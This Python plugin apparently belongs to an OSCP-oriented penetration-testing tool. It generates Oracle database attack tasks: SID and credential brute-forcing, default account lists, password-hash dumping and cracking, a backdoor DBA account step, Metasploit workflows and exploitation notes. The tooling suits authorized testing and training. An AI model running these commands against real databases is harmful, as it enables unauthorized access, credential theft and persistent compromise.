"""
Oracle Database service enumeration plugin

Generates tasks for Oracle database enumeration including:
- SID name enumeration (oracle-sid-brute)
- Version detection and TNS listener information
- Credential brute-force with default accounts
- Manual connection testing with sqlplus
- Oracle-specific exploitation paths (TNS poisoning, PL/SQL injection)

Extracted from: Nmap Cookbook Chapter 5 - Auditing Databases
Generated by: CrackPot v1.0
Date: 2025-10-08
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class OraclePlugin(ServicePlugin):
    """Oracle Database enumeration plugin"""

    @property
    def name(self) -> str:
        return "oracle"

    @property
    def default_ports(self) -> List[int]:
        return [1521, 1522, 1526, 1529, 1630]

    @property
    def service_names(self) -> List[str]:
        return ['oracle', 'oracle-tns', 'oracle-db', 'tnslsnr']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Oracle database services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Oracle enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', 'Oracle Database')

        tasks = {
            'id': f'oracle-enum-{port}',
            'name': f'Oracle Database Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: SID Enumeration (CRITICAL FIRST STEP)
        tasks['children'].append({
            'id': f'oracle-sid-brute-{port}',
            'name': 'Oracle SID Enumeration (TNS Listener)',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV --script oracle-sid-brute -p{port} {target}',
                'description': 'Enumerate Oracle SID names via TNS listener dictionary attack (REQUIRED for authentication)',
                'tags': ['OSCP:HIGH', 'ORACLE', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    '-sV': 'Service version detection',
                    '--script oracle-sid-brute': 'NSE script to brute-force Oracle SID names',
                    '--script-args oraclesids': '/path/to/custom-sids.txt (optional custom SID wordlist)',
                    '-p': f'Target port ({port})'
                },
                'success_indicators': [
                    'SID names discovered (e.g., orcl, XE, PROD, TEST)',
                    'Multiple SIDs enumerated from single listener',
                    'TNS listener responds to enumeration'
                ],
                'failure_indicators': [
                    'No SIDs found (wrong port, firewall, or listener disabled)',
                    'All SID attempts failed',
                    'TNS listener not responding'
                ],
                'next_steps': [
                    'Use discovered SID for authentication: oracle-brute --script-args oracle-brute.sid=<FOUND_SID>',
                    'Try connecting with sqlplus: sqlplus username/password@{target}:{port}/<SID>',
                    'Test each discovered SID with default credentials',
                    'Save SID names for credential brute-force',
                    'Document all SIDs for OSCP report'
                ],
                'alternatives': [
                    f'Manual TNS ping: tnscmd10g.pl version -h {target}',
                    f'Manual enumeration: oscanner -s {target}',
                    f'ODAT tool: python odat.py sidguesser -s {target}',
                    'Manual SID list to try: ORCL (default), XE (Express Edition), TEST, DEV, PROD, DB01, ORA10G, ORA11G, ORA12C',
                    'Check nmap wordlist: /usr/share/nmap/nselib/data/oracle-sids'
                ],
                'notes': 'CRITICAL FIRST STEP: Oracle requires SID name for authentication. Default wordlist contains 500+ common SIDs. ORCL = default installation, XE = Express Edition (free tier). Save with -oA for OSCP documentation. Time estimate: 5-10 minutes.',
                'estimated_time': '5-10 minutes'
            }
        })

        # TASK 2: Version Detection
        tasks['children'].append({
            'id': f'oracle-version-{port}',
            'name': 'Oracle TNS Listener Version Detection',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV -p{port} {target}',
                'description': 'Detect Oracle Database version via TNS listener banner',
                'tags': ['OSCP:HIGH', 'ORACLE', 'QUICK_WIN'],
                'flag_explanations': {
                    '-sV': 'Service version detection (aggressive probing for exact version)',
                    '-p': f'Specific port ({port})'
                },
                'success_indicators': [
                    'Oracle version identified (e.g., Oracle Database 11g, 12c, 19c)',
                    'TNS listener version banner grabbed',
                    'Service name and version confirmed'
                ],
                'failure_indicators': [
                    'Version detection failed (filtered or custom banner)',
                    'No banner disclosure'
                ],
                'next_steps': [
                    'Research version for known vulnerabilities: searchsploit oracle <version>',
                    'Check for CVEs specific to detected version',
                    'Match version to default accounts (version-specific defaults)',
                    'Identify patch level and update status'
                ],
                'alternatives': [
                    f'Manual TNS version query: tnscmd10g.pl version -h {target}',
                    'After authentication: SELECT * FROM v$version; (SQL query)',
                    'Metasploit: auxiliary/scanner/oracle/tnslsnr_version'
                ],
                'notes': 'Oracle version critical for exploit research. 11g, 12c, 19c have different default security postures. TNS listener often discloses version without authentication.'
            }
        })

        # TASK 3: Credential Brute-Force (requires SID from Task 1)
        tasks['children'].append({
            'id': f'oracle-brute-{port}',
            'name': 'Oracle Credential Brute-Force',
            'type': 'parent',
            'children': [
                {
                    'id': f'oracle-brute-default-{port}',
                    'name': 'Test Default Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -sV --script oracle-brute --script-args oracle-brute.sid=<SID_FROM_ENUM> -p{port} {target}',
                        'description': 'Brute-force authentication with default Oracle accounts (system, sys, scott, dbsnmp, etc.)',
                        'tags': ['OSCP:MEDIUM', 'ORACLE', 'BRUTE_FORCE', 'NOISY'],
                        'flag_explanations': {
                            '--script oracle-brute': 'NSE script for Oracle authentication brute-force',
                            '--script-args oracle-brute.sid': 'Oracle SID name (REQUIRED - obtain from oracle-sid-brute)',
                            'userdb': 'Custom username wordlist (default: /usr/share/nmap/nselib/data/oracle-default-accounts.lst)',
                            'passdb': 'Custom password wordlist (default: oracle-default-passwords)',
                            'brute.firstOnly': 'true (stop after first valid account)',
                            'unpwdb.timelimit': '10m (set time limit to avoid lockouts)'
                        },
                        'success_indicators': [
                            'Valid credentials found (e.g., system:system, scott:tiger)',
                            'Default accounts discovered',
                            'Authentication successful with blank passwords',
                            'Multiple accounts enumerated'
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'SID incorrect or not provided (returns TNS error)',
                            'Account lockout triggered (too many failed attempts)',
                            'Brute-force detection/blocking active'
                        ],
                        'next_steps': [
                            'Connect with found credentials: sqlplus username/password@{target}:{port}/<SID>',
                            'Enumerate database structure: SELECT * FROM all_tables;',
                            'Check user privileges: SELECT * FROM user_role_privs;',
                            'Escalate to DBA if possible: GRANT DBA TO username;',
                            'Search for sensitive data in application tables',
                            'Dump password hashes: SELECT name, password FROM sys.user$;'
                        ],
                        'alternatives': [
                            'Manual default account testing (try these first):',
                            '  - system:system (DBA account)',
                            '  - sys:sys (SYSDBA - highest privilege)',
                            '  - scott:tiger (demo account, often unchanged)',
                            '  - dbsnmp:dbsnmp (monitoring agent)',
                            '  - outln:outln (SQL plan management)',
                            'Metasploit: auxiliary/scanner/oracle/oracle_login',
                            'ODAT: python odat.py passwordguesser -s {target} -d <SID>',
                            'Hydra: hydra -L users.txt -P passwords.txt oracle-listener://{target}:{port}/<SID>',
                            'Update default accounts list: /usr/share/nmap/nselib/data/oracle-default-accounts.lst'
                        ],
                        'notes': 'CRITICAL: Must provide SID from oracle-sid-brute. Default accounts often unchanged in older installations. Oracle account lockout policies may trigger after 3-10 failed attempts. Try manual default accounts BEFORE brute-force to avoid lockout. Time estimate: 5-30 minutes depending on wordlist size.'
                    }
                },
                {
                    'id': f'oracle-manual-test-{port}',
                    'name': 'Manual Default Account Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manually test common Oracle default accounts (safer than automated brute-force)',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'ORACLE'],
                        'command': f'sqlplus system/system@{target}:{port}/<SID>',
                        'flag_explanations': {
                            'sqlplus': 'Oracle SQL*Plus command-line client',
                            'system/system': 'Username/password (common default)',
                            '@': 'Connect string delimiter',
                            '/': 'Separator for username and password',
                            '<SID>': 'Service identifier (from oracle-sid-brute)'
                        },
                        'success_indicators': [
                            'SQL*Plus connects successfully',
                            'SQL> prompt appears',
                            'Oracle session established',
                            'No authentication errors'
                        ],
                        'failure_indicators': [
                            'ORA-01017: invalid username/password',
                            'ORA-12154: TNS:could not resolve service name (wrong SID)',
                            'ORA-28000: account is locked',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Try these common default accounts IN ORDER:',
                            '1. system:system (DBA account - most common)',
                            '2. sys:sys (SYSDBA - requires "AS SYSDBA" suffix)',
                            '3. scott:tiger (demo/sample schema)',
                            '4. dbsnmp:dbsnmp (monitoring agent)',
                            '5. outln:outln (SQL tuning)',
                            '6. Same username as password (user:user pattern)',
                            '7. Blank passwords: system, sys, oracle',
                            '',
                            'If successful connection:',
                            '- Check privileges: SELECT * FROM session_privs;',
                            '- List users: SELECT username FROM all_users;',
                            '- Dump hashes: SELECT name, password FROM sys.user$; (requires DBA)',
                            '- Enable remote access: ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE;',
                            '- Create backdoor user: CREATE USER hacker IDENTIFIED BY password; GRANT DBA TO hacker;'
                        ],
                        'alternatives': [
                            'If sqlplus not available:',
                            '  - Install Oracle Instant Client + sqlplus',
                            '  - Use JDBC connection via Java',
                            '  - Use Python cx_Oracle library',
                            '  - Web-based tools: SQL Developer, DBeaver',
                            'Try connection variants:',
                            '  - sqlplus system/system@//<HOST>:<PORT>/<SID>',
                            '  - sqlplus system/system@<TNSNAMES_ENTRY>',
                            '  - sqlplus "sys/sys@{target}:{port}/<SID> as sysdba"'
                        ],
                        'notes': 'OSCP TIP: Manual testing safer than brute-force (avoids account lockout). Always try system:system FIRST - most common default. SYS account requires "AS SYSDBA" connection mode. Document EXACT connection string that worked for OSCP report. If no sqlplus: install Oracle Instant Client (free download from Oracle).'
                    }
                }
            ]
        })

        # TASK 4: Post-Authentication Enumeration
        tasks['children'].append({
            'id': f'oracle-post-auth-{port}',
            'name': 'Post-Authentication Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'oracle-enum-tables-{port}',
                    'name': 'Enumerate Database Structure',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enumerate Oracle database schema, tables, and sensitive data',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'ORACLE', 'POST_AUTH'],
                        'command': 'SQL> SELECT * FROM all_tables;',
                        'next_steps': [
                            'Key enumeration queries (run in sqlplus):',
                            '',
                            '-- List all tables',
                            'SELECT owner, table_name FROM all_tables;',
                            '',
                            '-- List all users',
                            'SELECT username, account_status, created FROM dba_users;',
                            '',
                            '-- Check current privileges',
                            'SELECT * FROM session_privs;',
                            'SELECT * FROM user_role_privs;',
                            '',
                            '-- Dump password hashes (requires DBA)',
                            'SELECT name, password, spare4 FROM sys.user$;',
                            '',
                            '-- List all roles',
                            'SELECT * FROM dba_roles;',
                            '',
                            '-- Find tables with interesting names',
                            'SELECT table_name FROM all_tables WHERE table_name LIKE \'%USER%\' OR table_name LIKE \'%PASS%\' OR table_name LIKE \'%CRED%\';',
                            '',
                            '-- Enumerate data in specific table',
                            'SELECT * FROM <owner>.<table_name>;',
                            '',
                            '-- Check for Java stored procedures (code execution vector)',
                            'SELECT object_name FROM all_objects WHERE object_type = \'JAVA CLASS\';',
                            '',
                            '-- List database links (lateral movement)',
                            'SELECT * FROM all_db_links;'
                        ],
                        'alternatives': [
                            'Oracle Data Dictionary views:',
                            '  - ALL_* : Objects accessible to current user',
                            '  - USER_* : Objects owned by current user',
                            '  - DBA_* : All objects (requires DBA privilege)',
                            'GUI tools: SQL Developer, DBeaver, Toad for Oracle'
                        ],
                        'notes': 'Focus on application schema tables (not SYS/SYSTEM schemas). Look for credentials, API keys, PII. Document all findings with SELECT statements for OSCP report.'
                    }
                },
                {
                    'id': f'oracle-dump-hashes-{port}',
                    'name': 'Extract Password Hashes',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Dump Oracle user password hashes for offline cracking (requires DBA privilege)',
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'ORACLE', 'POST_AUTH'],
                        'command': 'SQL> SELECT name, password, spare4 FROM sys.user$;',
                        'flag_explanations': {
                            'sys.user$': 'System table containing user account information',
                            'password': 'Oracle 10g hash (DES-based, weak)',
                            'spare4': 'Oracle 11g+ hash (SHA-1 based, stronger)'
                        },
                        'success_indicators': [
                            'Password hashes retrieved',
                            'Both 10g and 11g hashes visible (dual hash storage)',
                            'Hashes for multiple accounts dumped'
                        ],
                        'failure_indicators': [
                            'ORA-00942: table or view does not exist (not DBA)',
                            'ORA-01031: insufficient privileges',
                            'Empty results (no users or hashes cleared)'
                        ],
                        'next_steps': [
                            'Save hashes to file',
                            'Crack Oracle 10g hashes: hashcat -m 3100 hashes.txt wordlist.txt',
                            'Crack Oracle 11g hashes: hashcat -m 112 hashes.txt wordlist.txt',
                            'Crack Oracle 12c hashes: hashcat -m 12300 hashes.txt wordlist.txt',
                            'Use john: john --format=oracle10 hashes.txt',
                            'Test cracked passwords on other services (SSH, SMB, etc.)',
                            'Document hash extraction method for OSCP report'
                        ],
                        'alternatives': [
                            'Metasploit: auxiliary/scanner/oracle/oracle_hashdump',
                            'ODAT: python odat.py passwordguesser --dump-hashes',
                            'If not DBA: Focus on application data extraction instead'
                        ],
                        'notes': 'Oracle 10g hashes (DES) are weak and fast to crack. Oracle 11g+ uses salted SHA-1. Dual hash storage in 11g/12c for backward compatibility. Hashcat modes: 3100 (10g), 112 (11g), 12300 (12c).'
                    }
                }
            ]
        })

        # TASK 5: Exploitation Paths
        tasks['children'].append({
            'id': f'oracle-exploit-{port}',
            'name': 'Oracle Exploitation Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'oracle-plsql-injection-{port}',
                    'name': 'PL/SQL Injection Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for PL/SQL injection vulnerabilities in stored procedures and packages',
                        'tags': ['MANUAL', 'OSCP:LOW', 'ORACLE', 'EXPLOIT'],
                        'notes': 'PL/SQL injection allows privilege escalation and data access bypass. Test dynamic SQL in stored procedures. Check for SQL injection in web app that connects to Oracle. Look for vulnerable packages: DBMS_SQL, EXECUTE IMMEDIATE. Exploitation requires application access or authenticated Oracle session. Reference: Oracle PL/SQL Injection whitepaper.'
                    }
                },
                {
                    'id': f'oracle-java-rce-{port}',
                    'name': 'Java Stored Procedure RCE',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute OS commands via Oracle Java stored procedures (requires CREATE PROCEDURE privilege)',
                        'tags': ['MANUAL', 'OSCP:LOW', 'ORACLE', 'EXPLOIT'],
                        'notes': 'Oracle Java VM allows OS command execution if enabled. Check: SELECT value FROM v$option WHERE parameter = \'Java\'; Create malicious Java stored procedure to execute system commands. Requires CREATE PROCEDURE and JAVA privilege. Example: CREATE JAVA SOURCE to call Runtime.exec(). Advanced technique - research Oracle Java exploitation.'
                    }
                },
                {
                    'id': f'oracle-tns-poison-{port}',
                    'name': 'TNS Listener Poisoning',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit TNS listener to register rogue database instance (man-in-the-middle attack)',
                        'tags': ['MANUAL', 'OSCP:LOW', 'ORACLE', 'EXPLOIT'],
                        'notes': 'TNS poisoning allows registration of rogue database, intercepting connections. Check listener security: lsnrctl status. If ADMIN_RESTRICTIONS = OFF, listener accepts remote registration. Register fake instance to capture credentials. Requires network positioning. Advanced exploitation - rarely seen in OSCP.'
                    }
                }
            ]
        })

        # TASK 6: Metasploit Automation
        tasks['children'].append({
            'id': f'oracle-metasploit-{port}',
            'name': 'Metasploit Oracle Modules',
            'type': 'manual',
            'metadata': {
                'description': 'Automated Oracle enumeration and exploitation via Metasploit',
                'tags': ['AUTOMATED', 'OSCP:MEDIUM', 'ORACLE'],
                'command': 'msfconsole',
                'next_steps': [
                    'Available Metasploit modules:',
                    '',
                    'Enumeration:',
                    '  - auxiliary/scanner/oracle/tnslsnr_version (TNS listener version)',
                    '  - auxiliary/scanner/oracle/sid_enum (SID enumeration)',
                    '  - auxiliary/scanner/oracle/sid_brute (SID brute-force)',
                    '  - auxiliary/scanner/oracle/oracle_login (credential brute-force)',
                    '',
                    'Post-Authentication:',
                    '  - auxiliary/admin/oracle/oracle_sql (execute SQL queries)',
                    '  - auxiliary/admin/oracle/sid_brute (authenticated SID enum)',
                    '  - auxiliary/scanner/oracle/oracle_hashdump (dump password hashes)',
                    '',
                    'Exploitation:',
                    '  - exploit/windows/oracle/tns_auth_sesskey (CVE-2012-1675)',
                    '',
                    'Example workflow:',
                    'msf> use auxiliary/scanner/oracle/sid_brute',
                    'msf> set RHOSTS {target}',
                    'msf> set RPORT {port}',
                    'msf> run',
                    '',
                    'msf> use auxiliary/scanner/oracle/oracle_login',
                    'msf> set RHOSTS {target}',
                    'msf> set RPORT {port}',
                    'msf> set SID <FOUND_SID>',
                    'msf> run'
                ],
                'alternatives': [
                    'Manual enumeration (preferred for OSCP)',
                    'ODAT (Oracle Database Attacking Tool): https://github.com/quentinhardy/odat',
                    'oscanner: Perl-based Oracle security scanner'
                ],
                'notes': 'Metasploit automates enumeration but manual testing shows deeper understanding for OSCP. Always verify Metasploit findings manually. Document exact commands used for OSCP report.'
            }
        })

        # TASK 7: CVE Research (conditional on version)
        if version:
            tasks['children'].append({
                'id': f'oracle-cve-{port}',
                'name': f'Exploit Research: Oracle {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-oracle-{port}',
                        'name': f'SearchSploit: Oracle {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit oracle {version}',
                            'description': 'Search ExploitDB for Oracle vulnerabilities',
                            'tags': ['OSCP:HIGH', 'RESEARCH', 'ORACLE'],
                            'success_indicators': [
                                'Exploits found for specific version',
                                'CVE numbers identified',
                                'PoC exploits available'
                            ],
                            'next_steps': [
                                'Review exploit details: searchsploit -x <exploit_id>',
                                'Download exploit: searchsploit -m <exploit_id>',
                                'Test in controlled environment first',
                                'Adapt exploit to target configuration'
                            ],
                            'alternatives': [
                                'Google: "Oracle {version} exploit"',
                                'GitHub: Search for Oracle PoCs',
                                'Oracle Security Alerts: https://www.oracle.com/security-alerts/'
                            ],
                            'notes': 'Key Oracle CVEs: CVE-2012-1675 (TNS auth), CVE-2014-4237 (Java deserialization). Focus on pre-authentication and privilege escalation exploits.'
                        }
                    }
                ]
            })

        return tasks
